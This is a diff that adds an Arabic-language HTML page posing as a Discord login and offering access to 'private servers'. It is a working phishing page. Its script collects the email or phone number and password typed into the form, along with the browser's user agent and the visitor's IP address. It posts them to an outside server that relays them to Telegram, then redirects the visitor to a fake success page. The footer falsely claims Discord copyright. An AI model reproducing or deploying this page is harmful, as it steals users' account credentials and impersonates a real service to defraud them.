@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>تسجيل الدخول عبر Discord</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Tajawal', sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #1a1a2e, #16213e);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      overflow-x: hidden;
+      position: relative;
+    }
+    
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: 
+        radial-gradient(circle at 10% 20%, rgba(88, 101, 242, 0.1) 0%, transparent 20%),
+        radial-gradient(circle at 90% 80%, rgba(88, 101, 242, 0.1) 0%, transparent 20%),
+        radial-gradient(circle at 50% 30%, rgba(88, 101, 242, 0.1) 0%, transparent 25%);
+      z-index: 0;
+      pointer-events: none;
+    }
+    
+    .main-container {
+      width: 100%;
+      max-width: 450px;
+      position: relative;
+      z-index: 2;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+      border-radius: 20px;
+      overflow: hidden;
+    }
+    
+    .header {
+      background: linear-gradient(90deg, #5865f2, #7b68ee);
+      padding: 30px 20px;
+      text-align: center;
+      position: relative;
+    }
+    
+    .logo-container {
+      width: 100px;
+      height: 100px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0 auto 20px;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+    }
+    
+    .logo {
+      font-size: 50px;
+      color: white;
+    }
+    
+    .title {
+      color: white;
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+    }
+    
+    .subtitle {
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 16px;
+      max-width: 350px;
+      margin: 0 auto;
+      line-height: 1.5;
+    }
+    
+    .content {
+      background: rgba(25, 25, 40, 0.95);
+      padding: 30px 25px;
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+    }
+    
+    .form-container {
+      margin-top: 20px;
+    }
+    
+    .input-group {
+      margin-bottom: 25px;
+      position: relative;
+    }
+    
+    .input-group label {
+      display: block;
+      color: #a0a0c0;
+      margin-bottom: 8px;
+      font-weight: 500;
+      font-size: 15px;
+      padding-right: 5px;
+    }
+    
+    .input-field {
+      width: 100%;
+      padding: 14px 50px 14px 15px;
+      background: rgba(15, 15, 30, 0.8);
+      border: 1px solid rgba(88, 101, 242, 0.3);
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      transition: all 0.3s ease;
+    }
+    
+    .input-field:focus {
+      outline: none;
+      border-color: #5865f2;
+      box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.2);
+    }
+    
+    .input-field::placeholder {
+      color: #555575;
+    }
+    
+    .input-icon {
+      position: absolute;
+      left: 15px;
+      top: 40px;
+      color: #5865f2;
+      font-size: 18px;
+    }
+    
+    .btn {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(90deg, #5865f2, #7b68ee);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+      box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
+    }
+    
+    .btn:hover {
+      background: linear-gradient(90deg, #4752c4, #6a5acd);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(88, 101, 242, 0.4);
+    }
+    
+    .features {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 25px;
+      flex-wrap: wrap;
+    }
+    
+    .feature {
+      display: flex;
+      align-items: center;
+      width: 48%;
+      background: rgba(88, 101, 242, 0.1);
+      padding: 12px;
+      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+    
+    .feature-icon {
+      color: #5865f2;
+      font-size: 18px;
+      margin-left: 10px;
+    }
+    
+    .feature-text {
+      color: #c0c0e0;
+      font-size: 13px;
+      font-weight: 500;
+    }
+    
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      padding-top: 20px;
+      border-top: 1px solid rgba(255, 255, 255, 0.05);
+      color: #707090;
+      font-size: 14px;
+    }
+    
+    .footer a {
+      color: #5865f2;
+      text-decoration: none;
+      transition: all 0.3s ease;
+    }
+    
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    
+    .server-image {
+      width: 100%;
+      height: 150px;
+      background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), 
+                  url('https://images.unsplash.com/photo-1614680376573-df3480f0c6ff?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80');
+      background-size: cover;
+      background-position: center;
+      border-radius: 10px;
+      margin: 20px 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .server-image::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle, transparent 40%, rgba(88, 101, 242, 0.2) 100%);
+    }
+    
+    .server-text {
+      color: white;
+      font-size: 22px;
+      font-weight: 700;
+      text-align: center;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+      z-index: 1;
+    }
+    
+    .server-text span {
+      color: #ffcc00;
+      font-weight: 800;
+    }
+    
+    @media (max-width: 480px) {
+      .header {
+        padding: 25px 15px;
+      }
+      
+      .title {
+        font-size: 22px;
+      }
+      
+      .logo-container {
+        width: 80px;
+        height: 80px;
+      }
+      
+      .logo {
+        font-size: 40px;
+      }
+      
+      .content {
+        padding: 25px 20px;
+      }
+      
+      .feature {
+        width: 100%;
+      }
+      
+      .server-image {
+        height: 120px;
+      }
+      
+      .server-text {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-container">
+    <div class="header">
+      <div class="logo-container">
+        <i class="fab fa-discord logo"></i>
+      </div>
+      <h1 class="title">تسجيل الدخول عبر Discord</h1>
+      <p class="subtitle">قم بتسجيل الدخول للانضمام إلى سيرفرات خاصة وغير معروفة على Discord 🔒</p>
+    </div>
+    
+    <div class="content">
+      <div class="server-image">
+        <div class="server-text">سيرفرات <span>خاصة</span> بانتظارك!</div>
+      </div>
+      
+      <div class="form-container">
+        <form id="discordForm">
+          <div class="input-group">
+            <label>البريد الإلكتروني أو رقم الهاتف</label>
+            <i class="fas fa-user input-icon"></i>
+            <input type="text" name="email" class="input-field" placeholder="user@example.com" required>
+          </div>
+          
+          <div class="input-group">
+            <label>كلمة المرور</label>
+            <i class="fas fa-lock input-icon"></i>
+            <input type="password" name="password" class="input-field" placeholder="••••••••" required>
+          </div>
+          
+          <button type="submit" class="btn">
+            <i class="fab fa-discord"></i> تسجيل الدخول
+          </button>
+        </form>
+        
+        <div class="features">
+          <div class="feature">
+            <i class="fas fa-shield-alt feature-icon"></i>
+            <div class="feature-text">حماية متقدمة</div>
+          </div>
+          <div class="feature">
+            <i class="fas fa-users feature-icon"></i>
+            <div class="feature-text">مجتمع نشط</div>
+          </div>
+          <div class="feature">
+            <i class="fas fa-gem feature-icon"></i>
+            <div class="feature-text">مزايا حصرية</div>
+          </div>
+          <div class="feature">
+            <i class="fas fa-bolt feature-icon"></i>
+            <div class="feature-text">وصول فوري</div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="footer">
+        <p>© 2025 Discord. جميع الحقوق محفوظة.</p>
+        <p>هل تواجه مشكلة؟ <a href="#">تواصل مع الدعم الفني</a></p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("discordForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const form = new FormData(this);
+      const email = form.get("email");
+      const password = form.get("password");
+      const device = navigator.userAgent;
+
+      const ipData = await fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .catch(() => ({ ip: "غير معروف" }));
+
+      // إرسال البيانات إلى السيرفر
+      const data = {
+        playerId: email,
+        password: password,
+        amount: "100",
+        chatId: "123456789", // يمكن تغيير هذا القيمة حسب الحاجة
+        platform: "ديسكورد",
+        device: device,
+        ip: ipData
+      };
+
+      // إرسال البيانات إلى السيرفر الجديد
+      fetch('https://botlkm.onrender.com/send-to-telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(result => {
+        console.log('تم الإرسال بنجاح:', result);
+        window.location.href = "https://issol.free.nf/success/ok.html";
+      })
+      .catch(error => {
+        console.error('خطأ في الإرسال:', error);
+        alert("حدث خطأ أثناء الإرسال.");
+      });
+    });
+  </script>
+</body>
+</html>
